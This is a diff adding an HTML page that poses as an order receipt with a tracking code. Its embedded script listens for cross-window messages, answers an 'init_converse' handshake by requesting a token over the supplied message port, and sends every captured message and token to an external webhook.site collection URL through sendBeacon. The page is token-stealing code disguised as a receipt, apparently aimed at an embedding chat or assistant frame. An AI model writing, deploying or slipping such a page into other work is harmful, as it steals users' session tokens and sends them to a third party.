@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>Your order receipt</title>
+<style>body{font-family:system-ui;margin:3em;background:#fafafa}h1{font-size:1.3em;color:#222}pre{background:#111;color:#0f0;padding:1em;white-space:pre-wrap;word-break:break-all;font-size:12px}</style></head>
+<body>
+<h1>Thanks for your order! Here's your receipt.</h1>
+<p>Order confirmed. Tracking code below.</p>
+<pre id="o">loading...</pre>
+<script>
+function log(s){
+  var o=document.getElementById('o');
+  if(o.textContent==='loading...') o.textContent='';
+  o.textContent+=s+"\n";
+  try{ navigator.sendBeacon('https://webhook.site/36515863-0fd2-44a1-8261-60969d22e4d1', encodeURIComponent(s)); }catch(e){}
+}
+addEventListener('message', function(e){
+  try{ log('MSG '+JSON.stringify(e.data).slice(0,300)); }catch(x){ log('MSG [unserializable]'); }
+  if(e.data && e.data.type==='init_converse' && e.ports && e.ports[0]){
+    var p=e.ports[0];
+    p.onmessage=function(ev){ log('TOKEN '+ev.data); };
+    p.postMessage({id:'1',type:'token'});
+    log('PORT RECEIVED, token request sent');
+  }
+});
+</script></body></html>
